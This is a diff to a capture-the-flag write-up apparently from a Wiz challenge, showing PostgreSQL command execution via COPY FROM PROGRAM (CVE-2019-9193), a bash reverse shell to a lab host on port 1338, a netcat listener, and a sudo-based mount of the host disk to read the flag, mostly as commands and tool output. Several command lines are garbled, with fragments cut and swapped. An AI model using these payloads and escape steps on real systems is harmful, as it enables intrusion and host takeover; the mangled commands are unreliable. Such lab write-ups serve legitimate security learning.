@@ -76,6 +76,9 @@ We can now login to the postgres by running:
 psql -h 172.19.0.2 -p 5432 -U user mydatabase 
 ```
 
+```
+CREATE TEMPORARY TABLE temp_output (output_text text);COPY temp_output FROM PROGRAM 'whoami';SELECT * FROM temp_output;
+```
 
 From nmap know that the PosgreSQL version is 9.6 and after a check in the web we found that it is vulknerable to CVE-2019-9193.  
 
@@ -352,4 +355,68 @@ To move between the shell you can use Ctrl+B and the arrows.
 python3 b.py -i 172.19.0.2 -p 5432 -U user -P SecretPostgreSQLPassword -c "ls /dev" -d mydatabase
 python3 b.py -i 172.19.0.2 -p 5432 -U user -P SecretPostgreSQLPassword -c "bash -i >& /dev/tcp/172.19.0.3/1338 0>&1" -d mydatabase
 python3 b.py -i 172.19.0.2 -p 5432 -U user -P SecretPostgreSQLPassword -c "nc -nvlp 1338" -d mydatabase
+```
+
+
+
+# Getting root
+
+# Breaking to the host  
+
+
+```
+SQLPassword -c "/usr/bin/sudo cat /proc/cmdline" -d mydatabase -P SecretPostgreS
+
+[+] Connecting to PostgreSQL Database on 172.19.0.2:5432
+[+] Connection to Database established
+[+] Checking PostgreSQL version
+[+] PostgreSQL 16.8 is likely vulnerable
+[+] Creating table _6afeb98a1a4cc3b77c9de6c1fbb9a6ba
+[+] Command executed
+
+console=ttyS0 quiet loglevel=0 reboot=k panic=1 pci=off init=/sbin/overlay-init root=/dev/vda ro virtio_mmio.device=4K@0xd0000000:5 virtio_mmio.device=4K@0xd0001000:6 virtio_mmio.device=4K@0xd0002000:7
+
+[+] Deleting table _6afeb98a1a4cc3b77c9de6c1fbb9a6ba
+```
+
+
+
+```
+SQLPassword -c "/usr/bin/sudo mount /dev/vda /tmp/host" -d mydatabaser -P SecretPostgreS
+
+[+] Connecting to PostgreSQL Database on 172.19.0.2:5432
+[+] Connection to Database established
+[+] Checking PostgreSQL version
+[+] PostgreSQL 16.8 is likely vulnerable
+[+] Creating table _e37e22eee41f5121cca0a13e04d2de40
+[+] Command executed
+
+
+[+] Deleting table _e37e22eee41f5121cca0a13e04d2de40
+
+SQLPassword -c "/usr/bin/sudo ls /tmp/host/flag" -d mydatabasecretPostgreS
+
+[+] Connecting to PostgreSQL Database on 172.19.0.2:5432
+[+] Connection to Database established
+[+] Checking PostgreSQL version
+[+] PostgreSQL 16.8 is likely vulnerable
+[+] Creating table _17452ccb86b038839035ad07f04deb33
+[+] Command executed
+
+/tmp/host/flag
+
+[+] Deleting table _17452ccb86b038839035ad07f04deb33
+
+SQLPassword -c "/usr/bin/sudo cat /tmp/host/flag" -d mydatabaser -P SecretPostgreS
+
+[+] Connecting to PostgreSQL Database on 172.19.0.2:5432
+[+] Connection to Database established
+[+] Checking PostgreSQL version
+[+] PostgreSQL 16.8 is likely vulnerable
+[+] Creating table _a260daafe6bd64dd7cd645ecea4d4892
+[+] Command executed
+
+WIZ_CTF{how_the_tables_have_turned_guests_to_hosts}
+
+[+] Deleting table _a260daafe6bd64dd7cd645ecea4d4892
 ```
